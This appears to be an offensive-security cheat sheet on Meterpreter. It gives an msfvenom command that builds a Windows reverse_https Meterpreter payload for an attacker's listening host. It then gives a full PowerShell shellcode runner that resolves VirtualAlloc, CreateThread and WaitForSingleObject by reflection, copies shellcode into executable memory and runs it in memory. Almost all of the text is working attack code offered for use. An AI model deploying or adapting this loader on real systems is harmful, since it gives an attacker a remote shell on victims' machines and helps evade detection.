# Meterpreter

### 1) Generate shellcode

    # If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f ps1

### 2) meterpreter.ps1

    function getDelegateType {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
            [Parameter(Position = 1)] [Type] $delType = [Void]
        )
    
        $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
          DefineDynamicModule('InMemoryModule', $false).
          DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
          [System.MulticastDelegate])
    
      $type.
        DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
          SetImplementationFlags('Runtime, Managed')
    
      $type.
        DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
          SetImplementationFlags('Runtime, Managed')
    
        return $type.CreateType()
    }
    
    function LookupFunc {
        Param ($moduleName, $functionName)
    
        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
          Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $tmp=@()
        $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
    }
    
    $VirtualAllocAddr = LookupFunc kernel32.dll VirtualAlloc
    $VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
    $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)
    $VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    
    $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    
    # Replace with shellcode malicious code
    [Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,......
    
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
    
    $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
    
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
